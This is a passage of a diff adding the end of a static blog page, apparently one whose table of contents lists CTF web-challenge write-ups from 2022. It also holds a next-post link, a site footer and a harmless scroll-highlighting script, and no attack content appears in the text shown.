+<li><a href="#8%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019secret-file-2022823">8.[极客大挑战 2019]Secret File 2022.8.23</a></li>
+<li><a href="#9gxyctf2019ping-ping-ping-2022823">9.[GXYCTF2019]Ping Ping Ping 2022.8.23</a></li>
+<li><a href="#10%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019lovesql-2022823">10.[极客大挑战 2019]LoveSQL 2022.8.23</a></li>
+<li><a href="#11bsidessf2020mini-matroyshka-2022824">11.[BSidesSF2020]mini-matroyshka 2022.8.24</a></li>
+<li><a href="#12%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019knife-2022829">12.[极客大挑战 2019]Knife 2022.8.29</a></li>
+<li><a href="#13%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019http-2022829">13.[极客大挑战 2019]Http 2022.8.29</a></li>
+<li><a href="#14%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019upload-202294">14.[极客大挑战 2019]Upload 2022.9.4</a></li>
+<li><a href="#15actf2020-%E6%96%B0%E7%94%9F%E8%B5%9Bupload-202294">15.[ACTF2020 新生赛]Upload 2022.9.4</a></li>
+<li><a href="#16%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019babysql-202295">16.[极客大挑战 2019]BabySQL 2022.9.5</a></li>
+<li><a href="#17roarctf-2019easy-calc-202295">17.[RoarCTF 2019]Easy Calc 2022.9.5</a></li>
+<li><a href="#18%E6%8A%A4%E7%BD%91%E6%9D%AF-2018easy_tornado-202296">18.[护网杯 2018]easy_tornado 2022.9.6</a></li>
+<li><a href="#19%E6%8A%A4%E7%BD%91%E6%9D%AF-2018easy_tornado">19.[护网杯 2018]easy_tornado</a></li>
+<li><a href="#20%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019php">20.[极客大挑战 2019]PHP</a></li>
+<li><a href="#21actf2020-%E6%96%B0%E7%94%9F%E8%B5%9Bbackupfile">21.[ACTF2020 新生赛]BackupFile</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://gudiffany.github.io/post/ctfshow-meng-xin-web/">
+              <h3 class="post-title">
+                ctfshow 萌新web 更新中
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://gudiffany.github.io//atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
